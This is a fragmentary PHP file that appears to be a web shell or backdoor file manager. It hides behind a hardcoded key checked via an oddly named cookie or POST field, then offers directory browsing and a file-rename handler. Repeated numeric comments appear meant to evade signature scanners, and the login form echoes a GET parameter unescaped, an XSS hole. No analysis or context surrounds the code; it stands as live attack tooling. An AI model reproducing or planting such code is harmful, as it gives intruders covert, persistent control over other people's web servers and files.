...
$auth_key = "fa1883bae9c2d38b1a66167ab34b57b1";
...
$pass = false;
if (isset($_COOKIE['pw_name_50291'])) {
    if(($_COOKIE['pw_name_50291']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50291'])) {
        if(($_POST['pw_name_50291']) == $auth_key) {
            setcookie("pw_name_50291", $_POST['pw_name_50291']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50291' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738802525640035 1738802525865051 1738802525201507 1738802525712989
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738802525640035 1738802525865051 1738802525201507 1738802525712989
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738802525640035 1738802525865051 1738802525201507 1738802525712989
            $name = PATH . "/" . $_GET['r'];
